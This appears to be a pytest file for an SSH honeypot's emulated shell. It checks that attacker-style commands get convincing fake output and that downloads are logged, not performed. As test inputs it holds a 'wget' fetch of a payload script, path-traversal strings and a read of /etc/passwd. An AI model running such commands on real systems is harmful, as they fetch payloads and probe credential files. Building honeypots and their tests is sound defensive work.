from honeypots.ssh_hp.shell import FakeShell


def test_basic_commands():
    sh = FakeShell("root")
    assert sh.run("whoami").output == "root\n"
    assert "root" in sh.run("cat /etc/passwd").output
    assert sh.run("cd /var/www").output == ""
    assert sh.cwd == "/var/www"
    assert "index.html" in sh.run("ls").output


def test_unknown_command_and_chaining():
    sh = FakeShell("root")
    assert "command not found" in sh.run("nmap localhost").output
    out = sh.run("whoami; pwd").output
    assert out == "root\n/root\n"


def test_download_is_only_logged():
    sh = FakeShell("root")
    r = sh.run("wget http://example.com/payload.sh")
    assert r.downloads == [{"tool": "wget", "url": "http://example.com/payload.sh"}]
    assert "unable to resolve" in r.output


def test_exit():
    assert FakeShell("root").run("exit").exit is True


def test_path_traversal_stays_in_fake_fs():
    sh = FakeShell("root")
    assert "No such file" in sh.run("cat ../../../../../../etc/../nonexistent").output
    assert "No such file" in sh.run("cat C:\\Windows\\win.ini").output
